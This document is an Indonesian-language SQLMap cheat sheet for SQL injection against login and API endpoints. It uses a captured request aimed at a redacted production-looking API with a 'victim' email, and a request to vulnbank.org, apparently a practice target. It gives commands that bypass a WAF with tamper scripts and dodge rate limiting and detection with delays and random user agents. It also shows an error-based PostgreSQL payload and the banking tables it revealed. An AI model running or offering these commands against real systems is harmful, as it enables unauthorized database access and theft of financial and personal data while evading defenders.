# SQLMap

## 

```bash
sqlmap -u "https://target.com?page="  --tamper=space2comment,between,randomcase --level=5 --risk=3 --dbs
```

## 

Ambil Request dari Burp simpan sebagai `login-req`,atau apapun bebas

isi file :

```http
POST /api/auth/loginregisterverify HTTP/2
Host: api.redacted.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Vr: i17qx6tH
Content-Type: application/json
Content-Length: 126
Origin: https://www.redacted.com
Referer: https://www.redacted.com/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Priority: u=0
Te: trailers

{"code":"186215","email":"victim@gmail.com","device_type":"Desktop","registered_from":"IND","register_device_type":"WEB"}
```

```bash
sqlmap -r login-req --batch --risk 3 --level 5 --ignore-code 500,401 -D public --tables
```

spesifik test parameter tertentu:

```bash
sqlmap -r login-req -p code,email --batch --risk 3 --ignore-code 500,401 -D public --tables
```

Alternatif command lain yang lebih proper

```bash
sqlmap -r login-req --batch --risk 3 --level 5 --dbms postgresql --ignore-code 500,401 -D public --tables --threads 10
```

Otomatis detect semua parameter (JSON + Header):

```bash
sqlmap -r login-req --batch --risk 3 --level 5 --headers="Vr: i17qx6tH" --ignore-code 500,401 -D public --tables
```

Slow down with delay kalua kena **rate limiting (HTTP 429)**

```bash
sqlmap -r login-req -p code,email --batch --risk 3 --level 5 --delay 5 --timeout 10 --retries 2 --ignore-code 500,401 -D public --tables
```
Gunakan --safe-url untuk menghindari rate limit

```bash
sqlmap -r login-req -p code,email --batch --risk 3 --level 5 --delay 4 --safe-url "https://www.onevasco.com" --safe-freq 3 --ignore-code 500,401 -D public --tables
```

Tambahkan tamper untuk bypass WAF + rate limiting

```bash
sqlmap -r login-req -p code,email --batch --risk 3 --level 5 --delay 3 --random-agent --tamper=space2comment,apostrophemask,versionedkeywords --ignore-code 500,401 -D public --tables
```

Random delay + random agent (biar ga keliatan pattern)

```bash
sqlmap -r login-req -p code,email --batch --risk 3 --level 5 --delay 3 --random-agent --time-sec 10 --ignore-code 500,401 -D public --tables
```

## di vulnabnk.org

```http
POST /login HTTP/2
Host: vulnbank.org
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1NjAzLCJ1c2VybmFtZSI6IlRlc3RpbmcxMjMiLCJpc19hZG1pbiI6ZmFsc2UsImlhdCI6MTc4MDU0Mjk4N30.u0x9ykUSdEplr-4LNwFEg_Ahwb7ra01vhMKzNJOW_Mw
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://vulnbank.org/api/docs/
Content-Type: application/json
Content-Length: 78
Origin: https://vulnbank.org
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{
  "username": "Testing12",
  "password": "pass123",
  "is_admin": true
   
}
```

Command :

```bash
sqlmap -r login-req -p username --batch -D public --tables --ignore-code 500,401 --risk 3
```

Contoh Response :

```bash
---
Parameter: JSON username ((custom) POST)
    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: {
  "username": "Testing12' AND 8728=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (8728=8728) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)) AS NUMERIC) AND 'MQZV'='MQZV",
  "password": "pass123",
"is_admin": true
   
}
---
Database: public
[10 tables]
+-------------------+
| bill_categories   |
| bill_payments     |
| billers           |
| card_transactions |
| loans             |
| merchant_payments |
| merchants         |
| transactions      |
| users             |
| virtual_cards     |
+-------------------+
```